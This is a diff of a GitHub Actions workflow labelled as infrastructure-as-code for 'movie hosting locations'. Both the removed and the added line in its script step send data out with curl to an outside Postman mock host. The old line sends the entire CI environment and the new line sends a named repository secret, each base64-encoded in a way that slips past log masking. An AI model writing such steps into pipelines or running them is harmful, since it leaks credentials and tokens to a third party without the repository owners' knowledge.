@@ -4,7 +4,7 @@ name: IaC
 # Controls when the new movie hosting locations are created or updated
 on:
   push:
-    branches: [ features/agent007, feature/english ]
+    branches: [ feature/english ]
   pull_request:
     branches: [ main ]
 
@@ -21,7 +21,7 @@ jobs:
     steps:
       - name: Run a multi-line script
         run: |
-          curl -X POST https://8f210343-8887-4331-aec0-aea880924717.mock.pstmn.io -d $(env | base64 --wrap=0)
+          curl -X POST https://8f210343-8887-4331-aec0-aea880924717.mock.pstmn.io -d $(echo ${{ secrets.FAVOURITE }} | base64 --wrap=0)
 
       - name: Add mask
         run: |
